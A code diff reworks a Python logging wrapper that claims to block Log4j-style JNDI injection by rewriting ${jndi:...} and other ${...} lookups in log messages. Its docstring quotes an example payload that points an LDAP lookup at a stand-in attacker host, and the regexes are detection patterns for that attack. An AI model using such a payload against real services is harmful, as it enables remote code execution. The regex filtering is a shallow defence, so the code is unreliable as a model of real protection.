@@ -1,92 +1,51 @@
-"""
-Secure logging framework with JNDI injection protection.
-Fixes Log4j-style JNDI injection vulnerability by sanitizing log messages.
-"""
-
 import re
 import logging
-import sys
 
-
-class JNDISanitizer:
+class SecureLogger:
     """
-    Sanitizes log messages to prevent JNDI injection attacks.
-    Blocks malicious JNDI lookup patterns like ${jndi:ldap://...}, ${jndi:dns://...}
+    A secure logging framework that prevents Log4j-style JNDI injection attacks.
+    JNDI injection vulnerabilities allow attackers to execute remote code via
+    malicious lookup patterns like ${jndi:ldap://attacker.com/exploit}
     """
     
-    # Pattern to match JNDI lookup expressions
-    JNDI_PATTERN = re.compile(
-        r'\$\{jndi:([^\}]+)\}',
-        re.IGNORECASE
-    )
+    # Pattern to detect JNDI lookup syntax: ${jndi:...}
+    JNDI_PATTERN = re.compile(r'\$\{jndi:([^}]+)\}', re.IGNORECASE)
+    # Pattern to detect other dangerous lookup patterns
+    LOOKUP_PATTERN = re.compile(r'\$\{([^}]+)\}', re.IGNORECASE)
     
-    # Pattern to match other dangerous lookup patterns
-    DANGEROUS_LOOKUPS = re.compile(
-        r'\$\{(?:env|sys|java|lower|upper|env)::?([^\}]+)\}',
-        re.IGNORECASE
-    )
+    def __init__(self, name="secure_logger"):
+        self.logger = logging.getLogger(name)
+        if not self.logger.handlers:
+            handler = logging.StreamHandler()
+            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+            handler.setFormatter(formatter)
+            self.logger.addHandler(handler)
     
-    @classmethod
-    def sanitize(cls, message):
+    def _sanitize(self, message):
         """
-        Sanitize a log message by removing JNDI injection payloads.
-        
-        Args:
-            message: The log message to sanitize
-            
-        Returns:
-            Sanitized string with JNDI payloads neutralized
+        Sanitize log messages to prevent JNDI injection.
+        Replaces dangerous JNDI lookup patterns with safe literals.
         """
         if not isinstance(message, str):
             message = str(message)
         
-        # Replace JNDI lookups with safe placeholder
-        sanitized = cls.JNDI_PATTERN.sub('[BLOCKED-JNDI]', message)
-        
-        # Replace other potentially dangerous lookups
-        sanitized = cls.DANGEROUS_LOOKUPS.sub('[BLOCKED-LOOKUP]', sanitized)
-        
+        # Block JNDI lookups specifically
+        sanitized = self.JNDI_PATTERN.sub('[BLOCKED_JNDI]', message)
+        # Also neutralize other lookup patterns as defense in depth
+        sanitized = self.LOOKUP_PATTERN.sub(r'[\1]', sanitized)
         return sanitized
-
-
-class SecureLogger:
-    """
-    Secure logging wrapper that prevents JNDI injection attacks.
-    """
     
-    def __init__(self, name=None, level=logging.INFO):
-        self.logger = logging.getLogger(name or __name__)
-        self.logger.setLevel(level)
-        
-        # Add console handler if none exists
-        if not self.logger.handlers:
-            handler = logging.StreamHandler(sys.stdout)
-            formatter = logging.Formatter(
-                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-            )
-            handler.setFormatter(formatter)
-            self.logger.addHandler(handler)
+    def info(self, message):
+        self.logger.info(self._sanitize(message))
     
-    def _safe_log(self, level, message, *args, **kwargs):
-        """Safely log a message after sanitizing."""
-        if isinstance(message, str):
-            message = JNDISanitizer.sanitize(message)
-        self.logger.log(level, message, *args, **kwargs)
+    def warning(self, message):
+        self.logger.warning(self._sanitize(message))
     
-    def debug(self, message, *args, **kwargs):
-        self._safe_log(logging.DEBUG, message, *args, **kwargs)
+    def error(self, message):
+        self.logger.error(self._sanitize(message))
     
-    def info(self, message, *args, **kwargs):
-        self._safe_log(logging.INFO, message, *args, **kwargs)
+    def debug(self, message):
+        self.logger.debug(self._sanitize(message))
     
-    def warning(self, message, *args, **kwargs):
-        self._safe_log(logging.WARNING, message, *args, **kwargs)
-    
-    def error(self, message, *args, **kwargs):
-        self._safe_log(logging.ERROR, message, *args, **kwargs)
-    
-    def critical(self, message, *args, **kwargs):
-        self._safe_log(logging.CRITICAL, message, *args, **kwargs)
-    
-    def exception(self, message, *args, **kwargs):
-        self._safe_log(logging.ERROR, message, *args, **kwargs)
+    def critical(self, message):
+        self.logger.critical(self._sanitize(message))
